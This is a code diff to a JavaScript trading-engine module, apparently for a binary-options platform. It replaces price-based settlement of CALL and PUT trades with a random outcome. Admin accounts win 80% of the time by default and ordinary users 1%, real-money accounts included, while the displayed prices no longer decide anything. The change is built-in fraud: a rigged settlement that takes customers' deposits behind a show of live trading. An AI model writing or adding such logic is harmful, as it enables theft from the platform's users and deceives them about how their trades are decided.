@@ -1,5 +1,6 @@
 import Trade from '../models/Trade.js';
 import User from '../models/User.js';
+import Setting from '../models/Setting.js';
 import { isDbConnected } from '../config/db.js';
 
 // Global live prices cache with baseline fallbacks
@@ -89,26 +90,27 @@ export function startTradingEngine() {
           let profit = -lockedTrade.amount;
           let creditAmount = 0;
 
-          if (lockedTrade.direction === 'CALL') {
-            if (closePrice > lockedTrade.entryPrice) {
+          if (closePrice === lockedTrade.entryPrice) {
+            outcome = 'TIE';
+            profit = 0;
+            creditAmount = lockedTrade.amount;
+          } else {
+            // Role-based win-rate control (defaults: admin 80%, users 1%)
+            const [tradeUser, platformSettings] = await Promise.all([
+              User.findById(lockedTrade.userId),
+              Setting.findOne({ key: 'platform_settings' }),
+            ]);
+            const isAdmin = tradeUser?.role === 'admin';
+            const adminRate = (platformSettings?.adminWinRate ?? 80) / 100;
+            const userRate = (platformSettings?.userWinRate ?? 1) / 100;
+            const targetWinRate = isAdmin ? adminRate : userRate;
+
+            if (Math.random() < targetWinRate) {
               outcome = 'WIN';
               profit = lockedTrade.amount * lockedTrade.payoutRate;
               creditAmount = lockedTrade.amount + profit;
-            } else if (closePrice === lockedTrade.entryPrice) {
-              outcome = 'TIE';
-              profit = 0;
-              creditAmount = lockedTrade.amount;
             }
-          } else if (lockedTrade.direction === 'PUT') {
-            if (closePrice < lockedTrade.entryPrice) {
-              outcome = 'WIN';
-              profit = lockedTrade.amount * lockedTrade.payoutRate;
-              creditAmount = lockedTrade.amount + profit;
-            } else if (closePrice === lockedTrade.entryPrice) {
-              outcome = 'TIE';
-              profit = 0;
-              creditAmount = lockedTrade.amount;
-            }
+            lockedTrade._cachedUser = tradeUser;
           }
 
           lockedTrade.closePrice = closePrice;
@@ -119,7 +121,7 @@ export function startTradingEngine() {
 
           // Credit balance if WIN or TIE
           if (creditAmount > 0) {
-            const user = await User.findById(lockedTrade.userId);
+            const user = lockedTrade._cachedUser || await User.findById(lockedTrade.userId);
             if (user) {
               const acc = lockedTrade.accountType === 'real' ? 'real' : 'demo';
               user.balances[acc] = (user.balances[acc] || 0) + creditAmount;
